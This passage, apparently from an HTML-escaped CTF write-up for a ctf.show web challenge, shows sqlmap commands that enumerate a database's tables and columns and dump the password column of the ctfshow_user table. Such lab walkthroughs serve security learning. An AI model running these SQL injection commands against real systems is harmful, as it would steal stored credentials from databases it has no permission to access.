4c-118e7a273427.challenge.ctf.show/api/?id=1&#34;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--refer&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ctf.show&#34;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctfshow_web &lt;span class=&#34;token parameter variable&#34;&gt;--tables&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;┌──&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;└─$ sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1&#34;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--refer&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ctf.show&#34;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctfshow_web &lt;span class=&#34;token parameter variable&#34;&gt;-T&lt;/span&gt; ctfshow_user &lt;span class=&#34;token parameter variable&#34;&gt;--columns&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;┌──&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;└─$ sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.show/api/?id=1&#34;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--refer&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ctf.show&#34;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; ctfshow_web &lt;span class=&#34;token parameter variable&#34;&gt;-T&lt;/span&gt; ctfshow_user &lt;span class=&#34;token parameter variable&#34;&gt;-C&lt;/span&gt; pass &lt;span class=&#34;token parameter variable&#34;&gt;--dump&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;img data-src=&#34;\images\article_images\image-20250827150653446.png&#34; alt=&#34;image-20250827150653446&#34; style=&#34;zoom:33%;&#34; /&gt;
